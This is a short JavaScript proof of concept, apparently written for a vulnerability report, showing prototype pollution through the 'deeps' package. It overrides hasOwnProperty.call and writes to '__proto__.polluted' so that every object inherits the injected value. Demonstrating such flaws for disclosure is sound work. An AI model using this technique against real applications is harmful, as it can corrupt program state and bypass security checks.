Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const deeps = require('deeps');
deeps.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);